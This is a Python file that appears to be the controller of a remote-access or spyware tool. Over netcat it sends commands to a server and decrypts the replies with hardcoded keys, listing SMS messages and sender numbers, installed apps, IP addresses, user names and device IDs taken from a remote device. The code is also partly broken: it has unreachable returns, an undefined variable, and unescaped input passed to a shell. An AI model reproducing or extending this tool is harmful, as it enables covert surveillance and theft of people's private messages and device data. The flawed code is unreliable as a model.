import subprocess
import re
import threading
#from views.indexView.db.script import insertRow
import readline
from views.libs.decrypt import EncodeBase64, decrypt_message
from os import system




def ClientSocketConnection(ipServer: str, commandUse: str):
    server_address = ipServer
    server_port = 8080

    #Verificar si el servidor está activo
    command = f"echo 'ping' | nc {server_address} {server_port}"
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    responseServer = result.stdout.decode()

    if responseServer == "pong":
        return(Commands(commandUse, server_address, server_port))
    elif responseServer == "":
        return(0)
    else:
        return(0)



def Commands(commandUse, server_address, server_port):
    try:
        print(commandUse)
        color_azul_oscuro = "\033[34m"
        color_rojo = "\033[91m"
        color_rosa_neon = "\033[95;1m"
        color_blanco = "\033[97;1m"
        fin_color = "\033[0m"# Imprimir las IPs
        
        
        # Solicitar al usuario que ingrese un mensaje
        message = commandUse
        # Lanzar nc para enviar el mensaje y recibir la respuesta del servidor
        command = f"echo '{message}' | nc {server_address} {server_port}"
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        responseServer = result.stdout.decode()
        
        # Imprimir la respuesta del servidor
        #return(color_blanco + "Respuesta del servidor: " + color_blanco + color_rojo +  responseServer + color_blanco)

        
        if message == "getsms":
            messages = []
            pattern = r"Sender: (\d+), Message: (.+?),"
            matches = re.finditer(pattern, responseServer)
            #print(responseServer)
            
            for match in matches:
                sender = match.group(1)
                message = match.group(2)
                messages.append({"Sender": sender, "Message": message})
            
            mensaje_rosa_neon = f"{color_rosa_neon}{messages}{fin_color}"
            return (
                mensaje_rosa_neon
            )        
        elif message == "getapp":
            responseServer = decrypt_message(responseServer, "#VCVaOEA1ciQ3eCNFM3dTMg==")
            lista_apps = [app.strip() for app in responseServer[1:-1].split(",")]
            conteoApps = 0
            # Imprimir cada aplicación en una nueva línea
            for app in lista_apps:
                conteoApps += 1
                return(f"app ({conteoApps}): {app}")
                
        elif message == "getip":
            responseServer = decrypt_message(responseServer, "WHpANlJ5MklEbSE3b1A4Sw==")
            ips_list = responseServer[1:-1].split(', ')
            ip_publica = ips_list[0]
            ip_privada = ips_list[1]
            # Imprimir las IPs
            return("IP Pública:", ip_publica)
            return("IP Privada:", ip_privada)
        
        elif message == "getuser":
            responseServer = decrypt_message(responseServer, "MiVhRkA2eklTZDhHIzlxWQ==")
            return(f"nombre usuario: {responseServer}")
            listUserName = responseServer.split(", ")
            nombre = listUserName[0]
            idDevice = listUserName[1]
            return(f"nombre: {nombre}")
            return(f"id Dispositivo: {idDevice}")
        
        elif message == "pushuser":
            
            responseServer = decrypt_message(responseServer, "KlM4I1E0dyQ3ZSVUMnVJVw==")
            pushDataDevice = responseServer.split(", ")
            idDevice = pushDataDevice[0]
            nameDevice = pushDataDevice[1]
            ip_publica = pushDataDevice[2].replace("[", "")
            ip_privada = pushDataDevice[3].replace("]", "")
            
            return(f"nombre: {nameDevice}")
            return(f"ip publica: {ip_publica}")
            return(f"ip privada: {ip_privada}")
            
        elif message == "pushapp":
            
            responseServer = decrypt_message(responseServer, "NEBlI1M4ZiFHN3JXSzZ6UQ==")
            
            readIdDevice = readIdDevice[0][0]
            
            
            lista_apps = [app.strip() for app in responseServer[1:-1].split(",")]
            conteoApps = 0
            # Imprimir cada aplicación en una nueva línea
            for app in lista_apps:
                conteoApps += 1
                return(f"app ({conteoApps}): {app}")
                
                
                
        elif message == "pushsms":
            messages = []
            
            readIdDevice = readIdDevice[0][0]
            
            
            
            pattern = r"Sender: (\d+), Message: (.+?),"
            matches = re.finditer(pattern, responseServer)
            
            for match in matches:
                sender = match.group(1)
                message = match.group(2)
                messages.append({"Sender": sender, "Message": message})
            
            mensaje_rosa_neon = f"\n{color_rosa_neon}{messages}{fin_color}"
            
            
            listaSenders = []
            listaMessages = []
            
            for i  in  messages:
                listaSenders.append(i['Sender'])
            for i  in  messages:
                listaMessages.append(i['Message'])

            for senders, mess in zip(listaSenders, listaMessages):
                return(f"{senders}: {mess}")                  
                
                
                              
        elif message == "getscreen":
            pass
        elif message == "clear":
            comando = "clear"
            subprocess.run(comando, shell=True)
            
            
        elif message == "test":
            #password_base64 = EncodeBase64(password6)
            #return(password_base64)
            decrypted_message = decrypt_message(responseServer, "#VCVaOEA1ciQ3eCNFM3dTMg==")
            return(decrypted_message)
            
    except Exception as e:
            return("Error:", e)
    
    else:
        pass

        


